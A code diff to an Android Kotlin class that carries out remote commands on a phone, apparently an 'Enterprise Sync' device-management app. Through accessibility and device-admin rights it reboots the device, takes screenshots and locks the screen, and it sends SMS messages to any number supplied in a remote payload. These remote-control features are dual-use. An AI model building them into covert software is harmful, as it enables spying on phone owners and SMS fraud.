@@ -17,11 +17,23 @@ import android.os.VibrationEffect
 import android.os.Vibrator
 import android.speech.tts.TextToSpeech
 import android.telephony.SmsManager
+import android.app.Activity
+import android.app.PendingIntent
+import android.content.BroadcastReceiver
+import android.content.IntentFilter
+import android.telephony.TelephonyManager
 import android.widget.Toast
 import androidx.core.content.ContextCompat
 import com.example.data.local.AppDatabase
 import com.example.data.local.RemoteCommandEntity
 import com.example.service.RemoteAccessibilityService
+import android.util.Log
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
+import android.content.Intent
+import android.telephony.SubscriptionManager
+import com.example.receiver.MyDeviceAdminReceiver
+import org.json.JSONObject
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.util.Locale
@@ -113,9 +125,38 @@ class RemoteCommandManager(private val context: Context) {
                     } else false
                     resultMessage = if (res) "Executed Remote Lock Screen." else "Accessibility Service disabled or unsupported Android version."
                 }
-                "GLOBAL_POWER_DIALOG", "POWER_DIALOG" -> {
+                "GLOBAL_POWER_DIALOG", "POWER_DIALOG", "POWER_MENU", "POWER", "REBOOT", "SHUTDOWN", "POWER_OFF" -> {
                     val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
-                    resultMessage = if (res) "Showed Power Dialog." else "Accessibility Service disabled."
+                    if (!res) {
+                        var adminRebootSuccess = false
+                        try {
+                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
+                            val adminComponent = ComponentName(context, MyDeviceAdminReceiver::class.java)
+                            if (dpm != null && dpm.isAdminActive(adminComponent)) {
+                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                                    dpm.reboot(adminComponent)
+                                    adminRebootSuccess = true
+                                }
+                            }
+                        } catch (e: Exception) {
+                            Log.e("RemoteCommandManager", "DevicePolicyManager reboot failed: ${e.message}")
+                        }
+
+                        if (adminRebootSuccess) {
+                            resultMessage = "Reboot initiated via Device Policy Manager."
+                        } else {
+                            try {
+                                val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
+                                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                                }
+                                context.startActivity(intent)
+                            } catch (_: Exception) {}
+                            resultMessage = "Accessibility Service is disabled. Please turn ON Enterprise Remote Accessibility in Device Settings -> Accessibility."
+                            isSuccess = false
+                        }
+                    } else {
+                        resultMessage = "Power Dialog displayed successfully."
+                    }
                 }
                 "GLOBAL_TAKE_SCREENSHOT", "TAKE_SCREENSHOT", "SCREENSHOT" -> {
                     val res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
@@ -159,29 +200,91 @@ class RemoteCommandManager(private val context: Context) {
                 "SEND_SMS", "SMS_SEND" -> {
                     var recipient = ""
                     var text = ""
-                    if (payload.contains("|")) {
-                        val parts = payload.split("|")
-                        if (parts.size >= 2) {
+
+                    val trimmed = payload.trim()
+
+                    // Parse JSON format
+                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
+                        try {
+                            val json = JSONObject(trimmed)
+                            recipient = json.optString("phone").ifEmpty {
+                                json.optString("recipient").ifEmpty {
+                                    json.optString("number").ifEmpty {
+                                        json.optString("to")
+                                    }
+                                }
+                            }
+                            text = json.optString("message").ifEmpty {
+                                json.optString("text").ifEmpty {
+                                    json.optString("body").ifEmpty {
+                                        json.optString("payload")
+                                    }
+                                }
+                            }
+                        } catch (_: Exception) {}
+                    }
+
+                    // Parse Pipe format
+                    if (recipient.isEmpty() || text.isEmpty()) {
+                        if (trimmed.contains("|")) {
+                            val parts = trimmed.split("|")
+                            if (parts.size >= 2) {
+                                val p0 = parts[0].trim()
+                                val p1 = parts[1].trim()
+                                if (p0.contains("=") || p1.contains("=")) {
+                                    val map = parts.associate { part ->
+                                        val kv = part.split("=", limit = 2)
+                                        if (kv.size == 2) kv[0].trim().lowercase() to kv[1].trim() else "" to ""
+                                    }
+                                    recipient = map["phone"] ?: map["number"] ?: map["recipient"] ?: map["to"] ?: ""
+                                    text = map["message"] ?: map["text"] ?: map["body"] ?: map["payload"] ?: ""
+                                } else {
+                                    recipient = p0
+                                    text = parts.subList(1, parts.size).joinToString("|").trim()
+                                }
+                            }
+                        }
+                    }
+
+                    // Parse Comma format
+                    if (recipient.isEmpty() || text.isEmpty()) {
+                        if (trimmed.contains(",")) {
+                            val parts = trimmed.split(",", limit = 2)
                             val p0 = parts[0].trim()
                             val p1 = parts[1].trim()
                             if (p0.contains("=") || p1.contains("=")) {
-                                val map = parts.associate {
-                                    val kv = it.split("=")
+                                val map = trimmed.split(",").associate { part ->
+                                    val kv = part.split("=", limit = 2)
                                     if (kv.size == 2) kv[0].trim().lowercase() to kv[1].trim() else "" to ""
                                 }
                                 recipient = map["phone"] ?: map["number"] ?: map["recipient"] ?: map["to"] ?: ""
-                                text = map["message"] ?: map["text"] ?: map["body"] ?: ""
-                            } else {
+                                text = map["message"] ?: map["text"] ?: map["body"] ?: map["payload"] ?: ""
+                            } else if (p0.matches(Regex("^[+\\d\\s\\-()]{3,}$"))) {
                                 recipient = p0
                                 text = p1
                             }
                         }
                     }
+
+                    // Parse Space format
+                    if (recipient.isEmpty() || text.isEmpty()) {
+                        val parts = trimmed.split(Regex("\\s+"), limit = 2)
+                        if (parts.size >= 2 && parts[0].matches(Regex("^[+\\d\\-()]{3,}$"))) {
+                            recipient = parts[0]
+                            text = parts[1]
+                        }
+                    }
+
                     if (recipient.isNotEmpty() && text.isNotEmpty()) {
-                        sendSmsMessage(recipient, text)
-                        resultMessage = "Sent SMS to $recipient."
+                        try {
+                            sendSmsMessage(recipient, text)
+                            resultMessage = "Sent SMS to $recipient."
+                        } catch (e: Exception) {
+                            resultMessage = "Failed to send SMS to $recipient: ${e.message}"
+                            isSuccess = false
+                        }
                     } else {
-                        resultMessage = "Invalid SEND_SMS payload ($payload). Format required: 'recipient|message' or 'phone=X|message=Y'"
+                        resultMessage = "Invalid SEND_SMS payload ($payload). Accepted formats: 'phone|message', 'phone=X|message=Y', 'phone, message', or JSON {'phone':'...', 'message':'...'}"
                         isSuccess = false
                     }
                 }
@@ -282,19 +385,122 @@ class RemoteCommandManager(private val context: Context) {
     private fun sendSmsMessage(recipient: String, text: String) {
         val hasSendSms = ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
         if (!hasSendSms) {
-            throw SecurityException("SEND_SMS permission not granted")
+            throw SecurityException("SEND_SMS permission is not granted on this device. Please grant SMS permission in Settings -> Apps -> Enterprise Sync -> Permissions.")
         }
-        @Suppress("DEPRECATION")
-        val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            context.getSystemService(SmsManager::class.java)
-        } else {
+
+        val cleanRecipient = recipient.replace("[^0-9+]".toRegex(), "").ifEmpty { recipient.trim() }
+        if (cleanRecipient.isEmpty()) {
+            throw IllegalArgumentException("Recipient phone number is missing or invalid.")
+        }
+
+        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
+        val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
+
+        var activeSubId: Int = SubscriptionManager.INVALID_SUBSCRIPTION_ID
+        try {
+            val defaultSubId = SubscriptionManager.getDefaultSmsSubscriptionId()
+            if (defaultSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
+                activeSubId = defaultSubId
+            } else {
+                val activeSubs = subManager?.activeSubscriptionInfoList
+                if (!activeSubs.isNullOrEmpty()) {
+                    activeSubId = activeSubs.first().subscriptionId
+                }
+            }
+        } catch (_: Exception) {}
+
+        val simState = telephonyManager?.simState ?: TelephonyManager.SIM_STATE_UNKNOWN
+        if (simState == TelephonyManager.SIM_STATE_ABSENT && activeSubId == SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
+            throw IllegalStateException("No active SIM card detected on this device. An active SIM card with cellular network service is required to send SMS.")
+        }
+
+        val smsManager: SmsManager = try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                val sysSmsManager = context.getSystemService(SmsManager::class.java)
+                if (activeSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID && sysSmsManager != null) {
+                    sysSmsManager.createForSubscriptionId(activeSubId)
+                } else {
+                    sysSmsManager ?: @Suppress("DEPRECATION") SmsManager.getDefault()
+                }
+            } else {
+                @Suppress("DEPRECATION")
+                if (activeSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
+                    SmsManager.getSmsManagerForSubscriptionId(activeSubId)
+                } else {
+                    SmsManager.getDefault()
+                }
+            }
+        } catch (_: Exception) {
+            @Suppress("DEPRECATION")
             SmsManager.getDefault()
         }
-        val parts = smsManager.divideMessage(text)
-        if (parts.size > 1) {
-            smsManager.sendMultipartTextMessage(recipient, null, parts, null, null)
+
+        val actionSent = "com.example.SMS_SENT_${System.currentTimeMillis()}"
+        val sentIntent = PendingIntent.getBroadcast(
+            context,
+            0,
+            Intent(actionSent).apply { setPackage(context.packageName) },
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE else PendingIntent.FLAG_UPDATE_CURRENT
+        )
+
+        val latch = java.util.concurrent.CountDownLatch(1)
+        var resultCode = Activity.RESULT_CANCELED
+        var failureReason = ""
+
+        val smsReceiver = object : BroadcastReceiver() {
+            override fun onReceive(ctx: Context?, intent: Intent?) {
+                val code = getResultCode()
+                resultCode = code
+                when (code) {
+                    Activity.RESULT_OK -> {
+                        failureReason = ""
+                    }
+                    SmsManager.RESULT_ERROR_GENERIC_FAILURE -> {
+                        failureReason = "Generic failure (Carrier network error, insufficient mobile balance, or invalid number format)."
+                    }
+                    SmsManager.RESULT_ERROR_NO_SERVICE -> {
+                        failureReason = "No cellular network service or signal available."
+                    }
+                    SmsManager.RESULT_ERROR_NULL_PDU -> {
+                        failureReason = "Null PDU error."
+                    }
+                    SmsManager.RESULT_ERROR_RADIO_OFF -> {
+                        failureReason = "Cellular radio is OFF (Airplane mode enabled)."
+                    }
+                    else -> {
+                        failureReason = "Carrier dispatch error code: $code."
+                    }
+                }
+                latch.countDown()
+            }
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            context.registerReceiver(smsReceiver, IntentFilter(actionSent), Context.RECEIVER_NOT_EXPORTED)
         } else {
-            smsManager.sendTextMessage(recipient, null, text, null, null)
+            context.registerReceiver(smsReceiver, IntentFilter(actionSent))
+        }
+
+        try {
+            val parts = smsManager.divideMessage(text)
+            if (parts.size > 1) {
+                val sentIntents = ArrayList<PendingIntent>()
+                for (i in parts.indices) {
+                    sentIntents.add(sentIntent)
+                }
+                smsManager.sendMultipartTextMessage(cleanRecipient, null, parts, sentIntents, null)
+            } else {
+                smsManager.sendTextMessage(cleanRecipient, null, text, sentIntent, null)
+            }
+
+            val confirmed = latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
+            if (confirmed && resultCode != Activity.RESULT_OK) {
+                throw Exception("SMS dispatch failed: $failureReason")
+            }
+        } finally {
+            try {
+                context.unregisterReceiver(smsReceiver)
+            } catch (_: Exception) {}
         }
     }
 }
